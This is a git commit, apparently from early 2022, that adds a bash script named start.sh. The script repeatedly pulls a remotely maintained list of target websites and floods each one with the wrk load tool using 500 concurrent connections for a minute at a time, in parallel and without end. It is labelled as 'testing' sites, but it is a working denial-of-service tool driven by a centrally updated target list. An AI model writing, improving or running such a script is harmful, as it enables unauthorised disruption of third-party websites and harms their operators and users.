0fcee43fa448eace8a5a6c83dac96c6d197ad872
ph <putin_huylo@tutanota.com>
2022-02-28 08:36:52 -0800

    draft

---
+++ start.sh
@@ -0,0 +1,48 @@
+#!/bin/bash
+
+TARGET_PATH="$(pwd)/ph_targets/target.txt"
+
+# get args
+while getopts t: flag
+do
+    case "${flag}" in
+        t) TREADS=${OPTARG};
+    esac
+done
+
+#param check
+if [ -z "${TREADS}" ]
+then 
+	TREADS=4
+fi
+
+echo "Start with ${TREADS} threads"
+sleep 1
+
+i=0
+while : 
+do
+    # pull targets
+    echo "Pull targets"
+    cd ./ph_targets/ && git pull &
+    wait 
+
+    while [[ $i -ne $TREADS ]]
+    do
+        while IFS= read -r line
+        do
+            ((i++))
+            echo "i = ${i}"
+            echo "Test site: $line"
+
+            wrk -c500 -d1m -t 1 $line  && sleep 1 &
+
+            if [[ $i -eq $TREADS ]]; then
+                break
+            fi
+        done < ${TARGET_PATH}
+    done
+    wait
+    i=0
+    echo "End cycle"
+done 
